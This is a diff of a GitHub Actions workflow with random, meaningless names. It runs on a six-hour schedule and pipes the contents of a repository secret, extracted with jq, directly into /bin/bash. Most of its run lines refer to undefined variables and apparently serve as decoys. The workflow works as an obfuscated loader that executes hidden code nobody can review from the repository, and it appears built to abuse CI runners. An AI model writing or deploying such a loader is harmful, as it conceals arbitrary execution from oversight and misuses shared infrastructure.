@@ -1,24 +1,25 @@
 name: overcookedmiserable
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 3/6 * * *'
+    - cron: '21 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: overcookedmiserable
         env:
-          bfdz8: ${{ secrets.bfdz8 }}
+          tvfrh0: ${{ secrets.tvfrh0 }}
         run: |
-          echo $bfdz8 | jq -r .ubeu4 | /bin/bash
-          echo $av6342 | jq -r .ecluq6 | /bin/bash
-          echo $qbpox3486 | jq -r .fvvt9 | /bin/bash
-          echo $gn2 | jq -r .ir22 | /bin/bash
-          echo $h92183 | jq -r .qgevh185 | /bin/bash
-          echo $o5 | jq -r .snj4347 | /bin/bash
-          echo $p9198 | jq -r .lyzpg339 | /bin/bash
-          echo $aug7210 | jq -r .wffbp8 | /bin/bash
-          echo $gvkm8 | jq -r .v905 | /bin/bash
+          echo $tvfrh0 | jq -r .sbb00 | /bin/bash
+          echo $mk32023 | jq -r .k57046 | /bin/bash
+          echo $se09189 | jq -r .jf1 | /bin/bash
+          echo $wo1 | jq -r .jwton74491 | /bin/bash
+          echo $yurdb392 | jq -r .imzvl72886 | /bin/bash
+          echo $u52 | jq -r .pycmg87 | /bin/bash
+          echo $u951 | jq -r .kxv13 | /bin/bash
+          echo $rof1 | jq -r .e5402 | /bin/bash
 
